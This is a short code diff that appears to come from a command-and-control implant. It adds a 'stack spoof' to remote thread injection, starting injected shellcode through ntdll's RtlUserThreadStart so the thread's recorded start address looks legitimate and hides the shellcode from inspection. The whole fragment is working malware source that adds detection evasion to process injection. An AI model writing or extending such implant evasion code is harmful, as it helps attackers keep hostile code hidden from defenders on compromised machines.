@@ -253,8 +253,22 @@ HANDLE ThreadCreate(
             ThreadAttr.Entry.pValue    = C_PTR( &Client );
             ThreadAttr.Length          = sizeof( PROC_THREAD_ATTRIBUTE_LIST );
 
+            /* Tier 1 inject stack spoof (HVC-044 Sub-2): use RtlUserThreadStart as StartRoutine
+             * so TEB.StartAddress records a legitimate ntdll address instead of the shellcode.
+             * NOTE: Arg is dropped; Entry receives NULL as its argument via RtlUserThreadStart.
+             *       Disable StackSpoof in profile for shellcode that reads its argument. */
+            PVOID StartRoutine = Entry;
+            PVOID StartArg     = Arg;
+
+#ifdef _WIN64
+            if ( Instance->Config.Implant.StackSpoof && Instance->Win32.RtlUserThreadStart ) {
+                StartRoutine = Instance->Win32.RtlUserThreadStart;
+                StartArg     = Entry;
+            }
+#endif
+
             /* execute the code by creating a new thread */
-            NtStatus = SysNtCreateThreadEx( &Thread, THREAD_ALL_ACCESS, NULL, Process, Entry, Arg, FALSE, 0, 0, 0, &ThreadAttr );
+            NtStatus = SysNtCreateThreadEx( &Thread, THREAD_ALL_ACCESS, NULL, Process, StartRoutine, StartArg, FALSE, 0, 0, 0, &ThreadAttr );
             if ( NT_SUCCESS( NtStatus ) ) {
                 if ( ThreadId ) {
                     *ThreadId = U_PTR( Client.UniqueThread );
